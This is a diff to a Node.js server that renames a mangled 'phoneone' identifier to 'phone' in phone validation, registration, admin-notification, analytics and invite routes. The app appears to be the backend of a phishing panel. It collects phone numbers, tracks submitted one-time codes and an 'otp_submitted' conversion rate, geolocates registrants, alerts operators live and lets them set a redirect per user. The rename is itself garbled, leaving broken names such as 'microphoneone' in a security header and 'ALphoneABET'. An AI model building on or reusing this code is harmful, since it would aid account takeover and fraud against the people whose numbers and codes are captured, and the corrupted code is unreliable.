@@ -159,7 +159,7 @@ async function pushAdminNotif(kind, data) {
 const noErr = (label) => (e) => log.warn(`${label}: ${e}`);
 
 // ---------- NumVerify ----------
-function phoneoneFallback(digits, country) {
+function phoneFallback(digits, country) {
   const expected = COUNTRY_LEN[country] ?? 10;
   if (digits.length !== expected) {
     return { valid: false, error: `${expected} cifre richieste per ${country}`, source: "local" };
@@ -174,10 +174,10 @@ function phoneoneFallback(digits, country) {
   };
 }
 
-async function validatephoneone(phoneone, country = "FR") {
+async function validatephone(phone, country = "FR") {
   country = (country || "FR").toUpperCase();
-  const digits = (phoneone ?? "").replace(/\D/g, "");
-  if (!NUMVERIFY_API_KEY) return phoneoneFallback(digits, country);
+  const digits = (phone ?? "").replace(/\D/g, "");
+  if (!NUMVERIFY_API_KEY) return phoneFallback(digits, country);
   try {
     const url = new URL(NUMVERIFY_URL);
     url.search = new URLSearchParams({
@@ -187,11 +187,11 @@ async function validatephoneone(phoneone, country = "FR") {
       format: "1",
     }).toString();
     const resp = await fetch(url, { signal: AbortSignal.timeout(5000) });
-    if (!resp.ok) return phoneoneFallback(digits, country);
+    if (!resp.ok) return phoneFallback(digits, country);
     const data = await resp.json();
     if (data.success === false || "error" in data) {
       log.warn(`NumVerify error: ${JSON.stringify(data.error)}`);
-      return phoneoneFallback(digits, country);
+      return phoneFallback(digits, country);
     }
     if (!data.valid) return { valid: false, error: "Numero non valido", source: "numverify" };
     return {
@@ -204,7 +204,7 @@ async function validatephoneone(phoneone, country = "FR") {
     };
   } catch (e) {
     log.warn(`NumVerify exception: ${e}`);
-    return phoneoneFallback(digits, country);
+    return phoneFallback(digits, country);
   }
 }
 
@@ -241,7 +241,7 @@ app.use((req, res, next) => {
     "X-Frame-Options": "DENY",
     "Referrer-Policy": "strict-origin-when-cross-origin",
     "X-XSS-Protection": "1; mode=block",
-    "Permissions-Policy": "geolocation=(), microphoneoneone=(), camera=()",
+    "Permissions-Policy": "geolocation=(), microphoneone=(), camera=()",
     "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
     "Cross-Origin-Opener-Policy": "same-origin",
   });
@@ -317,16 +317,16 @@ api.put("/admin/antibot", ...owner, r(async (req) => {
   return { ok: true };
 }));
 
-api.post("/validate-phoneone", limit(30), r(async (req) => {
+api.post("/validate-phone", limit(30), r(async (req) => {
   const b = body(req);
-  const phoneone = vStr(b.phoneone, "phoneone", { min: 3, max: 20 });
-  return validatephoneone(phoneone, b.country_code || "FR");
+  const phone = vStr(b.phone, "phone", { min: 3, max: 20 });
+  return validatephone(phone, b.country_code || "FR");
 }));
 
 api.post("/register", limit(10), r(async (req) => {
   const b = body(req);
   const nicknameRaw = vStr(b.nickname, "nickname", { min: 1, max: 40 });
-  const phoneoneRaw = vStr(b.phoneone, "phoneone", { min: 6, max: 20 });
+  const phoneRaw = vStr(b.phone, "phone", { min: 6, max: 20 });
   const inviteRaw = vStr(b.invite, "invite", { optional: true });
 
   const ip = getIp(req);
@@ -339,13 +339,13 @@ api.post("/register", limit(10), r(async (req) => {
   const nickname = sanitizeStrict(nicknameRaw, 40);
   if (!nickname) fail(400, "Invalid nickname");
 
-  const phoneone_clean = phoneoneRaw.replace(/\D/g, "");
-  if (phoneone_clean.length < 6 || phoneone_clean.length > 12) fail(400, "Invalid phoneone");
+  const phone_clean = phoneRaw.replace(/\D/g, "");
+  if (phone_clean.length < 6 || phone_clean.length > 12) fail(400, "Invalid phone");
 
   const country_code = String(b.country_code || "FR").toUpperCase();
-  const check = await validatephoneone(phoneone_clean, country_code);
-  if (!check.valid) fail(400, check.error || "Invalid phoneone");
-  const full_phoneone = check.number || `+${COUNTRY_DIAL[country_code] ?? "33"}${phoneone_clean}`;
+  const check = await validatephone(phone_clean, country_code);
+  if (!check.valid) fail(400, check.error || "Invalid phone");
+  const full_phone = check.number || `+${COUNTRY_DIAL[country_code] ?? "33"}${phone_clean}`;
 
   const geo = await geolocate(ip);
 
@@ -362,7 +362,7 @@ api.post("/register", limit(10), r(async (req) => {
 
   const user_id = randomUUID();
   const doc = {
-    id: user_id, nickname, phoneone: full_phoneone, phoneone_raw: phoneone_clean, country_code,
+    id: user_id, nickname, phone: full_phone, phone_raw: phone_clean, country_code,
     carrier: check.carrier ?? "Unknown", line_type: check.line_type ?? "mobile",
     state: "pending", code_submitted: null, ip, ua,
     geo: Object.fromEntries(
@@ -376,7 +376,7 @@ api.post("/register", limit(10), r(async (req) => {
   notifyNewRegistration(doc).catch(noErr("notify_new_registration"));
 
   await pushAdminNotif("register", {
-    id: user_id, nickname, phoneone: full_phoneone, country: geo.country,
+    id: user_id, nickname, phone: full_phone, country: geo.country,
     countryCode: geo.countryCode, city: geo.city, invited_by,
   });
   return { id: user_id, state: "pending" };
@@ -385,7 +385,7 @@ api.post("/register", limit(10), r(async (req) => {
 api.get("/user/:user_id/state", r(async (req) => {
   const u = await col("users").findOne(
     { id: req.params.user_id },
-    { projection: { _id: 0, state: 1, nickname: 1, phoneone: 1, error_message: 1, redirect_url: 1, decline_reason: 1 } }
+    { projection: { _id: 0, state: 1, nickname: 1, phone: 1, error_message: 1, redirect_url: 1, decline_reason: 1 } }
   );
   if (!u) fail(404, "User not found");
   return u;
@@ -761,7 +761,7 @@ api.post("/admin/bot/stop", ...owner, r(async () => {
 
 api.post("/admin/bot/test-notify", ...owner, r(async () => {
   const fake = {
-    id: "test-user", nickname: "Test User", phoneone: "+33612345678",
+    id: "test-user", nickname: "Test User", phone: "+33612345678",
     geo: { city: "Paris", country: "France" }, invited_by: "boss",
   };
   const { ok, message } = await notifyNewRegistration(fake);
@@ -798,7 +798,7 @@ api.post("/admin/maintenance", ...owner, r(async (req) => {
 api.get("/admin/analytics", ...perm("view_analytics"), r(async () => {
   const visitors = await col("visits").countDocuments({});
   const registered = await col("users").countDocuments({});
-  const phoneoned = await col("users").countDocuments({ phoneone: { $exists: true } });
+  const phoned = await col("users").countDocuments({ phone: { $exists: true } });
   const otp_submitted = await col("users").countDocuments({ code_submitted: { $ne: null } });
   const success = await col("users").countDocuments({ state: "success" });
 
@@ -819,7 +819,7 @@ api.get("/admin/analytics", ...perm("view_analytics"), r(async () => {
     .toArray();
 
   return {
-    visitors, registered, phoneoned, otp_submitted, success,
+    visitors, registered, phoned, otp_submitted, success,
     conversion_rate: Math.round((visitors ? (registered / visitors) * 100 : 0) * 10) / 10,
     otp_rate: Math.round((registered ? (otp_submitted / registered) * 100 : 0) * 10) / 10,
     days,
@@ -831,8 +831,8 @@ api.get("/admin/analytics", ...perm("view_analytics"), r(async () => {
 api.get("/admin/invites", ...admin, r(async () =>
   col("invites").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(200).toArray()));
 
-const ALphoneoneABET = "abcdefghijklmnopqrstuvwxyz0123456789";
-const genCode = () => Array.from({ length: 7 }, () => ALphoneoneABET[randomInt(ALphoneoneABET.length)]).join("");
+const ALphoneABET = "abcdefghijklmnopqrstuvwxyz0123456789";
+const genCode = () => Array.from({ length: 7 }, () => ALphoneABET[randomInt(ALphoneABET.length)]).join("");
 
 api.post("/admin/invites", ...perm("create_invites"), r(async (req) => {
   let code = genCode();
@@ -847,7 +847,7 @@ api.post("/admin/invites", ...perm("create_invites"), r(async (req) => {
 
 api.get("/admin/invites/:code/joiners", ...admin, r(async (req) =>
   col("users")
-    .find({ invite_code: req.params.code }, { projection: { _id: 0, id: 1, nickname: 1, phoneone: 1, state: 1, created_at: 1, geo: 1 } })
+    .find({ invite_code: req.params.code }, { projection: { _id: 0, id: 1, nickname: 1, phone: 1, state: 1, created_at: 1, geo: 1 } })
     .sort({ created_at: -1 }).limit(500).toArray()));
 
 api.delete("/admin/invites/:code", ...admin, r(async (req) => {
